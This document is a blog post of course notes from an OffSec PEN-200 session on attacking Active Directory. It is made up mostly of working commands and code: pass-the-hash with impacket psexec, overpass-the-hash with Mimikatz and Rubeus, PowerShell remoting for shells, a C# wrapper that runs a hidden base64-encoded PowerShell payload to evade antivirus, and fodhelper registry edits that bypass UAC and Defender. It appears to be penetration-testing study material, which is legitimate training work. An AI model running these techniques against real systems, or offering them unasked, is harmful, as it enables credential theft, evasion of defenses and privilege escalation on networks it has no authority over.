---
title: 'OffSec Live: PEN-200'
date: 2022-09-02 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2022-09-02-offsec-live-pen-200.html
author: 100007
---

# Active Directory Enumeration & Exploitation, Part 4

LM hashes aren’t used in WIndows anymore, and often empty or garbage values will work fine when passing a full NTLM hash (only the NT hash is important).

```
proxychains python3 \
	/usr/share/doc/python3-impacket/examples/psexec.py \
	-hashes ${LM_HASH}:${NT_HASH} ${USER}@${MACHINE}
```

There’s a technique called “overpass the hash” that allows you to take advantage of accounts that are authorized to interact with services but _not_ machines on a domain. The idea behind overpass-the-hash is to request a ticket from the domain controller for one user but then use that as the authentication credentials for a different user when running a command. This allows you to be logged in as, say, a service account but then use the credentials for a domain admin to interact with the domain controller. Stealthy!

```
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:$NT_HASH /run:$COMMAND"'
```

Note that the “NTLM” hash in the Mimikatz command line is actually just the NT hash.

Another reason to use overpass-the-hash is to be able to interact with services that are restricted to certain users who do _not_ have login permissions. This is a common(ish) technique for securing services on a domain.

Note that whenever an overpass-the-hash attack, the output of whoami will become desynced to your network credentials - whoami will still show the user you’re logged into, but the domain credentials you use on the network will be those of the user whose hash you “overpassed”.

Rubeus can be used to _remove_ tickets from an account.

```
Rubeus.exe purge
```

You can also use Rubeus to grab new tickets from a domain controller for a user in an overpass-the-hash attack.

```
Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /rc4:$NT_HASH /ptt
```

Note that Rubeus is generally detected by Windows AV these days.

The whole point of all of this is that when interacting with remote computers in an Active Directory domain, what matters is the _hash_ you present, _not_ the local user!

Many large companies will enable PowerShell Remoting on all machines in order to ease IT support burdens (by default, remoting is only enabled on domain controllers).

```
Invoke-Command -ComputerName $MACHINE `
	-ScriptBlock {$COMMANDS_TO_RUN}
```

Remoting can be used to create a reverse shell.

```
$SESSION_NAME = New-PSSession -ComputerName "$MACHINE"
Enter-PSSession -Session $SESSION_NAME
```

You need to be logged in as a user with permission to use PowerShell for remote administration, however, or be using overpass-the-hash to get an equivalent set of credentials.

C# can be used to bypass AV (at least as of September 2022) - just create a C# wrapper that fires up a PowerShell one-liner. (Sometimes this will need to be modified slightly to bypass AV, but generally you don’t have to tweak this code much - C# analysis doesn’t seem to be particularly robust for most AV products.)

```
using System;
namespace Game
{
	public class Program
	{
		public static void Main() {
			System.Diagnostics.Process P = new System.Diagnostics.Process();
			System.Diagnostics.ProcessStartInfo SI = new System.Diagnostics.ProcessStartInfo();
			SI.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
			SI.FileName = "powershell.exe";
			SI.Arguments = "-enc $BASE64_ENCODED_SCRIPT_TO_RUN";
			P.StartInfo = SI;
			P.Start();
		}
	}
}
```

This can be compiled using PowerShell - perhaps even on the target itself. What’s the advantage to doing this? You can use Invoke-Mimikatz to run this binary remotely to quickly obtain a remote shell with the permissions of the user you’re impersonating with overpass-the-hash (this is a way of getting a shell on a machine that you can interact with, but aren’t allowed to open a shell on directly).

```
$code = @"
using System;
namespace Game
{
	public class Program
	{
		public static void Main() {
			System.Diagnostics.Process P = new System.Diagnostics.Process();
			System.Diagnostics.ProcessStartInfo SI = new System.Diagnostics.ProcessStartInfo();
			SI.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
			SI.FileName = "powershell.exe";
			SI.Arguments = "-enc $BASE64_ENCODED_SCRIPT_TO_RUN";
			P.StartInfo = SI;
			P.Start();
		}
	}
}
"@
Add-Type -outputtype consoleapplication -outputassembly $BINARY_NAME -TypeDefinition $code -Language CSharp
```

The fodhelper binary can be abused to gain an admin shell on Windows boxes with two registry key changes.

```
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe"
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
```

Note that if you try to put powershell.exe into this, Defender will block the shell from being opened (in fact, the key value will be cleared on run). Other AV tools will even detect cmd.exe. It looks like this can be bypassed, however, by using the CurVer registry key to point fodhelper.exe to a different registry location:

```
New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" `
	-Name "(default)" -Value "cmd.exe /c start powershell.exe" -Force

New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\CurVer" `
	-Name "(default)" -value ".pwn" -Force
```

- [Utilizing Programmatic Identifiers (ProgIDs) for UAC Bypasses](https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses)
